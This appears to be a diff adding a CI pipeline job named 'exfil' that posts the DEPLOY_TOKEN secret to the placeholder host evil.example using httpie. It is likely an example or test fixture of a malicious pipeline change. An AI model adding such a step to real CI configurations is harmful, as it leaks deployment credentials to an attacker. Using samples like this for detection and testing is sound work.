@@ -1,0 +1,4 @@
+exfil:
+  image: alpine:3.19
+  script:
+    - 'http -v evil.example "token=$DEPLOY_TOKEN"'
